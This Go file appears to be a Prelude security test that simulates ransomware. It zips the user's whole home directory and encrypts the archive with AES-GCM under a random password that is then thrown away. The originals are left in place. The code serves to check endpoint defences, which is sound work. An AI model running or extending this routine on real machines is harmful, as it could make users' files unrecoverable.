/*
ID: acdda5fa-fba6-4da0-a300-0c2de172a574
NAME: Living off the Land: Zip and Encrypt Ransomware
UNIT: response
CREATED: 2023-09-26 15:56:56.580411
*/
package main

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"strings"

	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

func generatePassword(length int) string {
	const charset = "0123456789abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, length)
	for i := range result {
		index, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		result[i] = charset[index.Int64()]
	}
	return string(result)
}

func zipDirectory(srcDir string, destZipFile string) error {
	zipfile, err := os.Create(destZipFile)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	w := zip.NewWriter(zipfile)
	defer w.Close()

	walker := func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		relPath := strings.TrimPrefix(path, srcDir)
		zipFile, err := w.Create(relPath)
		if err != nil {
			return err
		}

		fsFile, err := os.Open(path)
		if err != nil {
			return err
		}
		defer fsFile.Close()

		_, err = io.Copy(zipFile, fsFile)
		return err
	}

	return filepath.Walk(srcDir, walker)
}

func encryptFile(inputFile, encryptedFile, key string) error {
	fsFile, err := os.Open(inputFile)
	if err != nil {
		return err
	}
	defer fsFile.Close()

	plaintext, err := io.ReadAll(fsFile)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	Endpoint.Write(encryptedFile, ciphertext)
	return nil
}

func test() {
	password := generatePassword(32)
	if len(password) != 32 {
		Endpoint.Stop(104)
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		Endpoint.Stop(104)
	}

	err = zipDirectory(homeDir, `backup.zip`)
	if err != nil {
		Endpoint.Stop(100)
	}

	err = encryptFile("backup.zip", "backup.zip.enc", password)
	if err != nil {
		Endpoint.Stop(100)
	}
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}
